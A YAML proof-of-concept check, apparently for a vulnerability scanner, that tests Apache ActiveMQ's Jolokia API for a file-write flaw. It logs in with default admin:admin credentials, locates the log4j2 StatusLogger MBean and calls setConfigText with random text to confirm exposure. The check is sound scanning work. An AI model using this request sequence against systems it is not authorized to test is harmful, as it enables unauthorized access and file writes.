name: poc-yaml-activemq-jolokia-write_file
manual: true
transport: http
set:
    origin: request.url
    charset: randomLowercase(8)
    xml: randomLowercase(8)
    default_auth: base64("admin:admin")
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/jolokia/list
            headers:
                Authorization: Basic {{default_auth}}
                Content-Type: application/json
                Origin: '{{origin}}'
        expression: response.body_string.contains("component=StatusLogger")
        output:
            type_id: '"component=StatusLogger,type=(?P<type_id>[0-9a-zA-Z]+)\"".submatch(response.body_string)["type_id"]'
    r1:
        request:
            cache: true
            method: POST
            path: /api/jolokia/
            headers:
                Authorization: Basic {{default_auth}}
                Content-Type: application/json
                Origin: '{{origin}}'
            body: |-
                {
                  "type": "EXEC",
                  "mbean": "org.apache.logging.log4j2:type={{type_id}}",
                  "operation": "setConfigText",
                  "arguments": ["{{xml}}","{{charset}}"]
                }
        expression: response.body_string.contains("Could not reconfigure from config text")
expression: r0() && r1()
detail:
    author: Chaitin
    links:
        - https://stack.chaitin.com/vuldb/detail/65837a71-a559-4967-8dd0-09f77e965f12
